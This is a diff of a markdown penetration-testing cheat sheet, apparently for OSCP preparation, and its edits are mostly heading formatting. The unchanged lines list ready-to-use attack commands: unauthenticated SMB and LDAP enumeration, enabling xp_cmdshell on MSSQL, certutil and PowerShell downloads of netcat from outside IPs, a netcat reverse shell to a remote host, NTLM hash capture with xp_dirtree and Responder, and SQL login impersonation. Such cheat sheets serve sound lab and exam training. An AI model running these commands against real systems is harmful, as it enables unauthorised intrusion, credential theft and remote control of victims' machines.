@@ -39,7 +39,7 @@ username/username<br>
 
 # 445 SMB
 
-- **Without Pass**<br>
+***Without Pass***<br>
 `enum4linux -a $ip`<br>
 `impacket-lookupsid $domain/$user@$domain -no-pass`<br>
 `smbmap  -H 10.10.10.100 --depth 10 -r   #List Shares`<br>
@@ -47,7 +47,7 @@ username/username<br>
 `smbclient //[ip]/[share] -N   #Enumerate Files`<br>
 
 
-- **With Pass**
+***With Pass***
 `lookupsid.py  $domain$user:$pass@$domain`<br>
 `lookupsid.py  #domain/$user:$pass@$ip | grep SidTypeUser | cut -d " " -f 2 | cut -d '\' -f 2<br>
 > [!IMPORTANT]
@@ -76,12 +76,12 @@ username/username<br>
 
 # 389 LDAP
 
-**Without Pass**<br>
+***Without Pass***<br>
 `ldapsearch -H ldap://$ip -x -b "DC=oscp,DC=exam"`<br>
 `ldapsearch -x -H ldap://$ip -s base namingcontexts`<br>
 `impacket-lookupsid '$domain/guest'@$domain -no-pass`<br>
 
-**With Pass**<br>
+***With Pass***<br>
 `lookupsid.py  $domain/$user:$pass@$domain`<br>
 `ldapsearch -x -H ldap://$ip -D '$user' -w '$pass' -s base namingcontexts`<br>
 
@@ -103,7 +103,7 @@ username/username<br>
 `enum_db            #show DBs`<br>
 `select * from   <DB name>.INFORMATION_SCHEMA.TABLES  #show tables`<br>
 
-**cmd command**<br>
+***cmd command***<br>
 `EXEC sp_configure 'show advanced options', 1;`<br>
 `RECONFIGURE;`<br>
 `EXEC sp_configure 'xp_cmdshell', 1;`<br>
@@ -111,19 +111,19 @@ username/username<br>
 `EXEC xp_cmdshell ' whoami /priv'`<br>
 
 
-**powershell**<br>
+***powershell***<br>
 `xp_cmdshell "certutil -urlcache -f http://192.168.45.247/nc64.exe nc64.exe"  #If cmd command dose not work, upgrade to poershell`<br>
 `xp_cmdshell "powershell -Command "(New-Object Net.WebClient).DownloadFile(''http://10.10.149.147:1235/nc64.exe'',''C:\Windows\Temp\nc64.exe'')"`<br>
 `xp_cmdshell "/windows/temp/nc64.exe 10.10.149.147 1234 -e powershell"`<br>
 
 
-**capture**<br>
+***NTLM capture***<br>
 `xp_dirtree \\192.168.1.210\shared`<br>
 `responder -I tun01`
 > [!IMPORTANT]
 > When the SQL service is running under a machine account, the authentication process returns the machine account hash, which is not crackable (e.g., $DC)
 
-**impersonate**<br>
+***impersonate***<br>
 `enum_impersonate'<br>  > impersonate`<br>
 `EXECUTE AS LOGIN = 'username to impersonate'  #impersonate`<br>
 `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`<br>
